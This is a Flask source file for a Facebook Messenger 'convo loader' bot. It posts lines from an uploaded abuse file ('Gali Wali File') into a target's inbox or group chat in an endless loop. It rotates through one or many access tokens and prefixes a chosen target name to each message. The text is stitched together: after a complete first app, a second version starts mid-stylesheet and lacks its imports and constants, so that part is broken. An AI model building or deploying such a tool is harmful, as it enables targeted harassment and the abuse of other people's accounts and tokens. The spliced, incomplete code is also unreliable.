from flask import Flask, request, render_template_string
import requests
import os
from time import sleep
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        if token_type == 'single':
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()

            while True:
                try:
                    for message1 in messages:
                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                        message = str(mn) + ' ' + message1
                        parameters = {'access_token': access_token, 'message': message}
                        response = requests.post(api_url, data=parameters, headers=headers)
                        if response.status_code == 200:
                            print(f"Message sent using token {access_token}: {message}")
                        else:
                            print(f"Failed to send message using token {access_token}: {message}")
                        time.sleep(time_interval)
                except Exception as e:
                    print(f"Error while sending message using token {access_token}: {message}")
                    print(e)
                    time.sleep(30)

        elif token_type == 'multi':
            token_file = request.files['tokenFile']
            tokens = token_file.read().decode().splitlines()
            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()

            while True:
                try:
                    for token in tokens:
                        for message1 in messages:
                            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                            message = str(mn) + ' ' + message1
                            parameters = {'access_token': token, 'message': message}
                            response = requests.post(api_url, data=parameters, headers=headers)
                            if response.status_code == 200:
                                print(f"Message sent using token {token}: {message}")
                            else:
                                print(f"Failed to send message using token {token}: {message}")
                            time.sleep(time_interval)
                except Exception as e:
                    print(f"Error while sending message using token {token}: {message}")
                    print(e)
                    time.sleep(30)

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GROUP CONVO🤍✨</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-image: url('https://ibb.co/XrsvtbZW');
    }
    .container{
      max-width: 300px;
      background-color: black and red;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 10px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 10px;
      color: blue;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝐒𝐀𝐍𝐉𝐔 𝐁𝐀𝐁𝐀 𝐗𝐖𝐃</h1>                                     
    <h1 class="mt-3">𝐒𝐈𝐍𝐆𝐋𝐄 + 𝐌𝐔𝐋𝐓𝐈 𝐓𝐎𝐊𝐄𝐍 </h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenType">𝐒𝐞𝐥𝐞𝐜𝐭 𝐓𝐨𝐤𝐞𝐧</label>
        <select class="form-control" id="tokenType" name="tokenType" required>
          <option value="single">𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐨𝐤𝐞𝐧</option>
          <option value="multi">𝐌𝐮𝐥𝐭𝐢 𝐓𝐨𝐤𝐞𝐧</option>
        </select>
      </div>
      <div class="mb-3">
        <label for="accessToken">𝐒𝐢𝐧𝐠𝐚𝐥 𝐓𝐨𝐤𝐞𝐧</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken">
      </div>
      <div class="mb-3">
        <label for="threadId">𝐄𝐧𝐭𝐞𝐫 𝐈𝐧𝐛𝐨𝐱 / 𝐆𝐫𝐨𝐮𝐩 𝐔𝐫𝐥𝐬 </label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">𝐓𝐚𝐭𝐭𝐞 𝐊𝐚 𝐍𝐚𝐚𝐌 𝐃𝐚𝐚𝐥 𝐁𝐤𝐥</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">𝐆𝐚𝐥𝐢 𝐖𝐚𝐥𝐢 𝐅𝐢𝐥𝐞 𝐃𝐚𝐚𝐥</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3" id="multiTokenFile" style="display: none;">
        <label for="tokenFile">Select Token File (for multi-token):</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
      </div>
      <div class="mb-3">
        <label for="time">𝐓𝐢𝐦𝐞 𝐃𝐚𝐚𝐋(𝐒𝐞𝐜𝐧𝐨𝐝𝐬)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Developed by 𝐒𝐀𝐍𝐉𝐔 𝐁𝐀𝐁𝐀 𝐗𝐖𝐃 2025. All Rights Reserved.</p>
    <p>Convo/Inbox Loader Tool</p>
    <p>Keep enjoying  <a href="https://www.facebook.com/sanjuxwd99</a></p>
  </footer>

  <script>
    document.getElementById('tokenType').addEventListener('change', function() {
      var tokenType = this.value;
      document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
      document.getElementById('accessToken').style.display = tokenType === 'multi' ? 'none' : 'block';
    });
  </script>
</body>
</html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
      --accent: #ff3864;
      --accent-dark: #c1327d;
      --text: #ffffff;
      --text-secondary: #a5b3c7;
      --card-bg: rgba(13, 2, 33, 0.7);
      --glow: 0 0 10px var(--primary), 0 0 20px var(--primary);
    }
    
    * {
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Exo 2', sans-serif;
      background: linear-gradient(-45deg, #0d0221, #160c39, #1a1a40);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      margin: 0;
      overflow-x: hidden;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .container {
      display: flex;
      gap: 30px;
      max-width: 1100px;
      width: 100%;
      position: relative;
      z-index: 2;
    }
    
    .floating-element {
      position: absolute;
      border-radius: 50%;
      background: rgba(0, 247, 255, 0.1);
      filter: blur(40px);
      z-index: 1;
    }
    
    .floating-element:nth-child(1) {
      width: 300px;
      height: 300px;
      top: -150px;
      left: -150px;
      animation: float 15s ease-in-out infinite;
    }
    
    .floating-element:nth-child(2) {
      width: 200px;
      height: 200px;
      bottom: -100px;
      right: -100px;
      background: rgba(255, 56, 100, 0.1);
      animation: float 12s ease-in-out infinite reverse;
    }
    
    @keyframes float {
      0%, 100% { transform: translate(0, 0) rotate(0deg); }
      50% { transform: translate(20px, 20px) rotate(180deg); }
    }
    
    .box {
      background: var(--card-bg);
      backdrop-filter: blur(12px);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 0 15px rgba(0, 247, 255, 0.3);
      text-align: center;
      flex: 1;
      border: 1px solid rgba(0, 247, 255, 0.2);
      position: relative;
      overflow: hidden;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    
    .box:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 25px rgba(0, 247, 255, 0.5);
    }
    
    .box::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      z-index: -1;
      background: linear-gradient(45deg, #00f7ff, #ff3864, #00a2ff, #c1327d);
      background-size: 400% 400%;
      animation: gradientBorder 3s ease infinite;
      border-radius: 22px;
    }
    
    @keyframes gradientBorder {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .monitor-box {
      flex: 1;
      display: flex;
      flex-direction: column;
    }
    
    h2 {
      margin-bottom: 20px;
      color: var(--primary);
      text-shadow: var(--glow);
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      letter-spacing: 1px;
      position: relative;
      display: inline-block;
    }
    
    h2::after {
      content: '';
      position: absolute;
      bottom: -10px;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(90deg, transparent, var(--primary), transparent);
      animation: pulseLine 2s infinite;
    }
    
    @keyframes pulseLine {
      0%, 100% { opacity: 0.2; }
      50% { opacity: 1; }
    }
    
    input, select {
      width: 90%;
      padding: 12px 15px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid rgba(0, 247, 255, 0.3);
      outline: none;
      font-size: 14px;
      background: rgba(0, 0, 0, 0.3);
      color: var(--text);
      transition: all 0.3s ease;
    }
    
    input:focus, select:focus {
      border-color: var(--primary);
      box-shadow: 0 0 10px rgba(0, 247, 255, 0.5);
    }
    
    input::placeholder { 
      color: var(--text-secondary); 
      opacity: 0.7;
    }
    
    button {
      padding: 12px 25px;
      margin: 15px 8px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      font-size: 14px;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }
    
    button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: 0.5s;
      z-index: -1;
    }
    
    button:hover::before {
      left: 100%;
    }
    
    .start { 
      background: linear-gradient(45deg, var(--primary), var(--primary-dark));
      color: #000; 
      box-shadow: 0 0 15px rgba(0, 247, 255, 0.5);
    }
    
    .start:hover { 
      transform: translateY(-3px);
      box-shadow: 0 0 20px rgba(0, 247, 255, 0.8);
    }
    
    .stop { 
      background: linear-gradient(45deg, var(--accent), var(--accent-dark));
      color: white; 
      box-shadow: 0 0 15px rgba(255, 56, 100, 0.5);
    }
    
    .stop:hover { 
      transform: translateY(-3px);
      box-shadow: 0 0 20px rgba(255, 56, 100, 0.8);
    }
    
    #status { 
      margin-top: 15px; 
      font-size: 16px; 
      color: var(--text-secondary); 
    }
    
    .hidden { display: none; }
    
    label { 
      font-size: 14px; 
      color: var(--text-secondary); 
      margin-top: 12px; 
      display: block; 
      text-align: left;
      margin-left: 20px;
    }
    
    .monitor-content {
      text-align: left;
      padding: 10px 20px;
    }
    
    .monitor-item {
      margin-bottom: 15px;
      padding-bottom: 15px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      position: relative;
    }
    
    .monitor-item::after {
      content: '▶';
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      color: var(--primary);
      font-size: 12px;
      opacity: 0.7;
    }
    
    .monitor-label {
      font-size: 12px;
      color: var(--text-secondary);
      margin-bottom: 5px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .monitor-value {
      font-size: 15px;
      color: var(--text);
      word-break: break-all;
      font-weight: 500;
    }
    
    .status-running {
      color: var(--primary);
      font-weight: bold;
      text-shadow: var(--glow);
      animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    
    .status-idle {
      color: var(--text-secondary);
    }
    
    .status-stopped {
      color: var(--accent);
      font-weight: bold;
      text-shadow: 0 0 10px var(--accent);
    }
    
    .log-container {
      max-height: 200px;
      overflow-y: auto;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      padding: 15px;
      margin-top: 15px;
      font-size: 12px;
      text-align: left;
      border: 1px solid rgba(0, 247, 255, 0.2);
    }
    
    .log-entry {
      margin-bottom: 8px;
      padding-bottom: 8px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      animation: fadeIn 0.5s ease;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(5px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .log-time {
      color: var(--primary);
      margin-right: 5px;
      font-family: 'Orbitron', sans-serif;
    }
    
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background-color: var(--primary);
      border-radius: 50%;
      animation: particleFloat 20s infinite linear;
    }
    
    @keyframes particleFloat {
      0% {
        transform: translateY(100vh) translateX(0);
        opacity: 0;
      }
      10% {
        opacity: 1;
      }
      90% {
        opacity: 1;
      }
      100% {
        transform: translateY(-100px) translateX(calc(-100px + 200px * var(--random)));
        opacity: 0;
      }
    }
    
    .typewriter {
      overflow: hidden;
      border-right: 2px solid var(--primary);
      white-space: nowrap;
      animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
    }
    
    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }
    
    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: var(--primary) }
    }
    
    @media (max-width: 900px) {
      .container {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="particles" id="particles"></div>
  <div class="floating-element"></div>
  <div class="floating-element"></div>
  
  <div class="container">
    <div class="box">
      <h2>🚀 𝐔𝐋𝐓𝐑𝐀 𝐌𝐄𝐒𝐒𝐄𝐍𝐆𝐄𝐑 𝐁𝐎𝐓</h2>
      <form id="sendForm" enctype="multipart/form-data">
        <label for="mode">Select Mode:</label>
        <select name="mode" id="mode" onchange="toggleMode()" required>
          <option value="single">🔑 Single Token</option>
          <option value="multi">🔑 Multi Token (File)</option>
        </select>

        <div id="singleBox">
          <input type="text" name="single_token" placeholder="Enter Single Access Token">
        </div>
        <div id="multiBox" class="hidden">
          <input type="file" name="multi_file" accept=".txt">
        </div>

        <input type="text" name="recipient_id" placeholder="Enter GC UID" required><br>
        <input type="text" name="hettar" placeholder="Enter Hettar Name"><br>
        <input type="number" name="delay" placeholder="Delay (seconds)" required><br>
        <input type="file" name="file" accept=".txt" required><br>

        <button type="button" class="start" onclick="startTask()">🚀 Start Sending</button>
        <button type="button" class="stop" onclick="stopTask()">🛑 Emergency Stop</button>
      </form>
      <p id="status">Status: <span class="status-idle">💤 Idle</span></p>
    </div>
    
    <div class="box monitor-box">
      <h2>📊 Live Monitoring</h2>
      <div class="monitor-content">
        <div class="monitor-item">
          <div class="monitor-label">Status</div>
          <div class="monitor-value" id="monitor-status">💤 Idle</div>
        </div>
        
        <div class="monitor-item">
          <div class="monitor-label">Messages Sent</div>
          <div class="monitor-value" id="monitor-sent">0</div>
        </div>
        
        <div class="monitor-item">
          <div class="monitor-label">Last Message</div>
          <div class="monitor-value" id="monitor-last-msg">-</div>
        </div>
        
        <div class="monitor-item">
          <div class="monitor-label">Last Token Used</div>
          <div class="monitor-value" id="monitor-last-token">-</div>
        </div>
        
        <div class="monitor-item">
          <div class="monitor-label">Start Time</div>
          <div class="monitor-value" id="monitor-start-time">-</div>
        </div>
        
        <div class="monitor-item">
          <div class="monitor-label">Activity Log</div>
          <div class="log-container" id="activity-log">
            <div class="log-entry"><span class="log-time">[System]</span> System initialized. Waiting for activity...</div>
          </div>
        </div>
      </div>
    </div>
  </div>

<script>
function createParticles() {
  const particlesContainer = document.getElementById('particles');
  const particleCount = 50;
  
  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement('div');
    particle.className = 'particle';
    
    // Random properties
    const size = Math.random() * 3 + 1;
    const posX = Math.random() * 100;
    const delay = Math.random() * 20;
    const duration = 15 + Math.random() * 15;
    
    particle.style.width = `${size}px`;
    particle.style.height = `${size}px`;
    particle.style.left = `${posX}vw`;
    particle.style.animationDelay = `${delay}s`;
    particle.style.animationDuration = `${duration}s`;
    particle.style.setProperty('--random', Math.random());
    
    particlesContainer.appendChild(particle);
  }
}

function toggleMode() {
  let mode = document.getElementById("mode").value;
  document.getElementById("singleBox").classList.toggle("hidden", mode !== "single");
  document.getElementById("multiBox").classList.toggle("hidden", mode !== "multi");
}

function addLogEntry(message) {
  const now = new Date();
  const timeString = '[' + now.toLocaleTimeString() + ']';
  const logContainer = document.getElementById('activity-log');
  const logEntry = document.createElement('div');
  logEntry.className = 'log-entry';
  logEntry.innerHTML = '<span class="log-time">' + timeString + '</span> ' + message;
  logContainer.appendChild(logEntry);
  
  // Remove old entries if more than 50
  if (logContainer.children.length > 50) {
    logContainer.removeChild(logContainer.children[0]);
  }
  
  logContainer.scrollTop = logContainer.scrollHeight;
}

function updateMonitor(data) {
  document.getElementById('monitor-status').innerText = data.status;
  document.getElementById('monitor-sent').innerText = data.sent_count;
  document.getElementById('monitor-last-msg').innerText = data.last_message;
  document.getElementById('monitor-last-token').innerText = data.last_token;
  document.getElementById('monitor-start-time').innerText = data.start_time;
  
  // Update main status
  const statusElem = document.getElementById('status');
  statusElem.innerHTML = 'Status: ';
  const statusSpan = document.createElement('span');
  
  if (data.status.includes('Running')) {
    statusSpan.className = 'status-running';
    statusSpan.innerText = '🚀 Running';
  } else if (data.status.includes('Stopped')) {
    statusSpan.className = 'status-stopped';
    statusSpan.innerText = '🛑 Stopped';
  } else {
    statusSpan.className = 'status-idle';
    statusSpan.innerText = '💤 Idle';
  }
  
  statusElem.appendChild(statusSpan);
}

function fetchMonitoringData() {
  fetch("/monitoring")
    .then(r => r.json())
    .then(data => {
      updateMonitor(data);
      setTimeout(fetchMonitoringData, 1000);
    })
    .catch(err => {
      setTimeout(fetchMonitoringData, 2000);
    });
}

function startTask() {
  let form = document.getElementById("sendForm");
  let formData = new FormData(form);
  
  addLogEntry("Starting task...");
  
  fetch("/start", { method: "POST", body: formData })
    .then(r => r.json())
    .then(d => {
      addLogEntry("Task started successfully");
    });
}

function stopTask() {
  addLogEntry("Stopping task...");
  
  fetch("/stop", { method: "POST" })
    .then(r => r.json())
    .then(d => {
      addLogEntry("Task stopped");
    });
}

// Start fetching monitoring data when page loads
document.addEventListener('DOMContentLoaded', function() {
  createParticles();
  fetchMonitoringData();
  addLogEntry("System fully initialized");
  
  // Add typewriter effect to title
  const title = document.querySelector('h2');
  const originalText = title.textContent;
  title.textContent = '';
  title.classList.add('typewriter');
  setTimeout(() => {
    title.textContent = originalText;
    title.classList.remove('typewriter');
  }, 3500);
});
</script>
</body>
</html>
"""

# ---------------- Background Task ---------------- #
def send_loop(tokens, recipient_id, hettar, delay, messages):
    global stop_flag, monitoring_data
    token_index = 0
    monitoring_data["sent_count"] = 0
    monitoring_data["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    monitoring_data["status"] = "Running"
    
    while not stop_flag:
        for msg in messages:
            if stop_flag:
                break
            final_msg = f"{hettar}: {msg}" if hettar else msg
            access_token = tokens[token_index % len(tokens)]
            token_index += 1

            payload = {
                "recipient": {"id": recipient_id},
                "message": {"text": final_msg}
            }
            params = {"access_token": access_token}
            try:
                res = requests.post(FB_API_URL, params=params, json=payload)
                monitoring_data["sent_count"] += 1
                monitoring_data["last_message"] = final_msg
                monitoring_data["last_token"] = access_token[:20] + "..." if len(access_token) > 20 else access_token
                print("Sent:", final_msg, res.json())
            except Exception as e:
                print("Error:", str(e))
            time.sleep(delay)
    
    monitoring_data["status"] = "Stopped"

# ---------------- Routes ---------------- #
@app.route("/")
def index():
    return render_template_string(html_page)

@app.route("/start", methods=["POST"])
def start():
    global stop_flag, task_thread, monitoring_data
    stop_flag = False
    mode = request.form["mode"]

    tokens = []
    if mode == "single":
        token = request.form.get("single_token", "").strip()
        if token: tokens = [token]
    elif mode == "multi":
        file = request.files["multi_file"]
        tokens = file.read().decode("utf-8").splitlines()

    recipient_id = request.form["recipient_id"]
    hettar = request.form.get("hettar", "")
    delay = int(request.form["delay"])
    file = request.files["file"]
    messages = file.read().decode("utf-8").splitlines()

    monitoring_data["status"] = "Starting..."
    
    task_thread = threading.Thread(target=send_loop, args=(tokens, recipient_id, hettar, delay, messages))
    task_thread.start()
    return jsonify({"status": "started"})

@app.route("/stop", methods=["POST"])
def stop():
    global stop_flag, monitoring_data
    stop_flag = True
    monitoring_data["status"] = "Stopping..."
    return jsonify({"status": "stopped"})

@app.route("/monitoring")
def get_monitoring_data():
    return jsonify(monitoring_data)

if __name__ == "__main__":

    app.run(host="0.0.0.0", port=22077, debug=True)
